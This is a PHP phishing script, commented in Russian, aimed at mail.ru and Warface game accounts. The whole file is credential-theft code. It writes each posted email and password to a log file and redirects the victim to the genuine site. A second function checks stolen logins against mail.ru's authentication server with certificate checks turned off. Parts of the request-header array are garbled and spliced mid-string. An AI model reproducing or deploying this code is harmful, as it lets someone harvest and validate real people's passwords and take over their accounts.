<?php
if (isset($_POST['mail'])&& isset($_POST['pass']))
{
	$Login = (string)$_POST['mail']; 
	$Pass = (string)$_POST['pass'];

	$redirectAfterLogin = "https://wf.mail.ru/"; // переадресация после корректного ввода
	
	
	$dt = date('H:i|d M');

	$log = fopen("Base.php","at"); 
	fwrite($log,"<div>$Login:$Pass | $dt |</div>\n"); // сообщение которое сохраняется в base.php  
	fclose($log);
	
	echo "<script>location.href='".$redirectAfterLogin."'</script>";
	exit;		
}

function WF_checkValid($login, $password)
{
	$pieces = explode("@", $login);
	$domn= $pieces[1];
	$email = $login."@".$domn.";".$password;

	$headers = array
	( 
		'Host: auth.mail.ru',
		'User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0',
		'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
		'Accept-Encoding: gzip, deflate',
		'Connection: keep-alive',
		'Content-Type: applU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
		'Accept-Encoding: gzip, deflate',
		'Connection: keep-alication/x-www-form-urlencoded',
	);

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://auth.mail.ru/cgi-bin/auth?Domain='.$domn.'&Login='.$login.'&Password='.$password);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($ch, CURLOPT_NOBODY, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_NOPROGRESS, 0);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	$data = curl_exec($ch);
	curl_close($ch);

   if(preg_match("/Set-Cookie/", $data))
		return true;
	else return false;
}
?>